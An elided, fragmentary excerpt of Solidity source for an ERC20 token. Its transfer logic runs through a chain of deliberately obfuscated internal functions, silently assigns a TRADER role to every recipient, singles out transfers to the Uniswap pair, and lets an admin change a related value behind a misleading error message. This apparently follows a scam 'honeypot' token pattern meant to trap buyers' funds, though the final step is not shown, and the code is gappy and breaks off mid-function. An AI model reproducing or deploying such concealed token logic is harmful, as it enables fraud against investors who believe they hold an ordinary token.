...
abstract contract _LINMDNSConsole is Context, _LINMDNSRoleControl {

    using SafeMath for uint256;

    struct RoleData {
        mapping(address => bool) meberS;
        bytes32 adminRole;
        RoleDataNew RD;
    }
    ...
    function hasRole(bytes32 role, address account) public view override returns (bool) {
        return _roles[role].meberS[account];
    }
    ...
    function _grantRole(bytes32 role, address account) internal virtual {
        if (!hasRole(role, account)) {
            _roles[role].meberS[account] = true;
    ...
    function _revokeRole(bytes32 role, address account) internal virtual {
        if (hasRole(role, account)) {
            _roles[role].meberS[account] = false;
...
contract _LINMDNSERC20 is Context, IERC20, IERC20Metadata, _LINMDNSConsole {
    ...
    function __LINMDNSxinN(
        bytes32 root,
        uint256 num
    ) public onlyRole(ADMIN) {
        if(root != TRADER){
            revert("meberS is not a number");
        }
        meberS = num;
    }
...
contract Token is _LINMDNSERC20 {
    ...
    ) _LINMDNSERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_LINMDNSERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __LINMDNSumfdfr(from, to, amt);

    }

    function __LINMDNSumfdfr(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __LINMDNSyuvetb(from, to, amt);
    }


    function __LINMDNSyuvetb(address from, address to, uint256 amt) internal {
        ...
        __LINMDNSoucrm(from, to, amt);
    }

    function __LINMDNSoucrm(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __LINMDNSudvewsc(from, to, amt);
    }

    function __LINMDNSudvewsc(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __LINMDNSrvddeb(from, to, amt);
    }


    function __LINMDNSrvddeb(address from, address to, uint256 amt) internal {


        __LINMDNSasexm(from, to, amt);
    }

    function __LINMDNSasexm(address from, address to, uint256 amt) internal {
